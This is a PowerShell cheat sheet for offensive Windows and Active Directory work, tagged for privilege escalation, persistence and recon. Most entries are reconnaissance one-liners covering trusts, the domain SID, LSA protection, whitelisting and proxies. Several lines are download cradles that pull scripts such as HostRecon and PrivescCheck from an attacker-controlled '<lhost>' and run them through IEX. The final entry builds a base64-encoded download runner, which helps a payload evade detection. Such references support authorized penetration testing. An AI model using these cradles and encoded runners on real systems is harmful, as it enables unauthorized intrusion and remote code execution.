# powershell

#plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 


## Get file in trash
```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```

## Get Proxy
```powershell
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://<ip>/<url>")
```

## Get language mode
```powershell
$ExecutionContext.SessionState.LanguageMode
```


## Verify PPL
```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

## Verify application whitelisting
```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

## show forest trust
```powershell
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

## Get domain trust
```powershell
Get-DomainTrust -Domain <domain>
```

## Get domain SID
```powershell
Get-DomainSID -domain <sid>
```

## hostrecon
https://github.com/dafthack/HostRecon

```
(new-object system.net.webclient).downloadstring('http://<lhost>/HostRecon.ps1') | IEX; Invoke-HostRecon
```

## privesccheck
https://github.com/itm4n/PrivescCheck

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/PrivescCheck.ps1') | IEX; Invoke-PrivescCheck
```

## powershell view assemblies
```powershell
[appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
```

## powershell get proxy address
```powershell
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
```

## powershell set proxy
```powershell
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://<proxaddress|$proxyAddr>")
```

## powershell - generate base64 encoded payload download runner
#plateform/linux #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 

```powershell
pwsh -Command '$text = "(New-Object System.Net.WebClient).DownloadString(''http://<lhost>/<file>'') | IEX";$bytes = [System.Text.Encoding]::Unicode.GetBytes($text);$EncodedText = [Convert]::ToBase64String($bytes);$EncodedText'
```

